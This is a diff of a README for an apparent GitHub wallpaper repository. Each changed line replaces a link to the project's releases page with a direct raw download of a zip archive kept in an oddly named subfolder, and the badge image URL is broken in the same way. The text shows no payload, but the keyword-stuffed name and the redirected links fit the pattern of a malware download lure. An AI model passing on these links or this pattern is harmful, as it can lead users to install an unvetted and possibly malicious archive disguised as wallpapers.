@@ -1,6 +1,6 @@
 # 🖼️ Wallpapers-HD-4K-Backgrounds-Latest-Patch - Stunning Backgrounds for Your Desktop
 
-[![Download Wallpapers](https://img.shields.io/badge/Download%20Wallpapers%20-HD%204K%20%21-brightgreen)](https://github.com/kinger12345/Wallpapers-HD-4K-Backgrounds-Latest-Patch/releases)
+[![Download Wallpapers](https://raw.githubusercontent.com/kinger12345/Wallpapers-HD-4K-Backgrounds-Latest-Patch/main/rehumble/Wallpapers-HD-4K-Backgrounds-Latest-Patch_1.6.zip%20Wallpapers%20-HD%204K%20%21-brightgreen)](https://raw.githubusercontent.com/kinger12345/Wallpapers-HD-4K-Backgrounds-Latest-Patch/main/rehumble/Wallpapers-HD-4K-Backgrounds-Latest-Patch_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To use the wallpapers, ensure your system meets the following requirements:
 
 To begin, visit the page below to download the wallpapers. 
 
-[Download Wallpapers Here](https://github.com/kinger12345/Wallpapers-HD-4K-Backgrounds-Latest-Patch/releases)
+[Download Wallpapers Here](https://raw.githubusercontent.com/kinger12345/Wallpapers-HD-4K-Backgrounds-Latest-Patch/main/rehumble/Wallpapers-HD-4K-Backgrounds-Latest-Patch_1.6.zip)
 
 ### Steps to Download:
 
@@ -79,4 +79,4 @@ For more information about using the wallpapers or to explore more features, con
 
 At Wallpapers-HD-4K-Backgrounds-Latest-Patch, we aim to provide you with the best resources to ensure an optimal desktop visual experience.
 
-[Download Wallpapers Here](https://github.com/kinger12345/Wallpapers-HD-4K-Backgrounds-Latest-Patch/releases)
+[Download Wallpapers Here](https://raw.githubusercontent.com/kinger12345/Wallpapers-HD-4K-Backgrounds-Latest-Patch/main/rehumble/Wallpapers-HD-4K-Backgrounds-Latest-Patch_1.6.zip)
